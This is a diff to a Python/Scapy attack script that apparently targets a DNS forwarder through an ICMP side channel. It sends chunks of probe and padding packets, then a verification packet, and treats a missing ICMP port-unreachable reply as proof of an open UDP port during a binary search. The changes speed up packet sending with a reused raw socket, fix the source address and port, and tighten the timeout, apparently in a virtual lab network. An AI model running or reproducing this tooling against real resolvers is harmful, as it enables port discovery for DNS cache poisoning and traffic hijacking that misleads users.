@@ -47,6 +47,8 @@ ICMP_recovering_time = '20ms'
 
 finished = 0
 
+global_socket = conf.L3socket(iface='vboxnet2')
+
 
 #https://stackoverflow.com/a/58135538/3450691
 # To count time elapsed by a function
@@ -114,16 +116,47 @@ class Logger(object):
         pass
 
 def step1(thread_id):
-    
-    ip_layer = IP(dst=forwarder_ip)
-    udp_layer = UDP(dport=forwarder_port, sport=RandShort())
+
+    my_ip = '192.168.58.1'
+    my_port = 9554
+
+    ip_layer = IP(dst=forwarder_ip, src=my_ip)
+    udp_layer = UDP(dport=forwarder_port, sport=my_port)
     dns_layer = DNS(rd=1, qd=DNSQR(qname=domain_name))
 
     packet = ip_layer / udp_layer / dns_layer
 
     lock.acquire()
+    
     ret = sr1(packet, verbose=True)
+    
+    '''
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    #sock.connect((forwarder_ip, forwarder_port))
+    #sock.setblocking(False)
+    #sock.bind((my_ip, my_port))
+    sock.sendto(bytes(repr(str(packet)), 'utf-8'), (forwarder_ip, forwarder_port))
+    #send(packet, verbose=True)
+
+    sock.bind((my_ip, my_port)) #local ip, local port
+
+    #t = AsyncSniffer(opened_socket=sock)
+
+    try:
+        reply, address = sock.recvfrom(512)
+        print (reply.show())
+    except socket.error as e:
+        print ("socket error")
+    except OSError as e:
+        print ("OS error")
+        
+    sock.close()
+    '''
+
+
     lock.release()
+
+    
 
     #print (ret.show())
     return
@@ -172,21 +205,27 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
     elapsed_time = time.process_time() - start_time
     print ("Time needed for generating packets: " + str(elapsed_time))
 
+    # improving scapy's packet sending performance
+    # https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html
+    
 
     start_time = time.process_time()
     for packet in probe_packet:
-        send(packet, verbose=False)
+        #send(packet, verbose=False)
+        global_socket.send(packet)
     for packet in padding_packet:
-        send(packet, verbose=False)
+        #send(packet, verbose=False)
+        global_socket.send(packet)
     elapsed_time = time.process_time() - start_time
     print ("Time needed for sending 50 packets: " + str(elapsed_time))
 
     #print("Sending verification packet")
 
     start_time = time.process_time()
+
     # This timeout is the crucial factor
-    # This is taking the majority of time of this function
-    reply = sr1(verification_packet, timeout=1, verbose=False) # in seconds
+    reply = sr1(verification_packet, timeout=.6, verbose=False) # in seconds
+
     elapsed_time = time.process_time() - start_time
     print ("Time needed for sending and receiving verification packet: " + str(elapsed_time))
     #print("Got reply from verificaiton packet")
@@ -195,13 +234,13 @@ def do_one_chunk_of_attack(port_start, number_of_probe_packet, number_of_padding
 
     if reply == None:
         print ("Yaaaay, there is one port open in this chunk.")
-        print (reply[ICMP].summary())
-        print (reply[ICMP].show())
         return port_start # important for the base condition of the binary search
     else:
         if reply.haslayer(ICMP):
             # Maybe need to check the error code also
             print("Got ICMP port unreachable message. No port is open.")
+            #print (reply[ICMP].summary())
+            #print (reply[ICMP].show())
             return -1
         elif reply.haslayer(UDP):
             print("Don't know what this means.")
@@ -314,3 +353,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+    #step1(1)
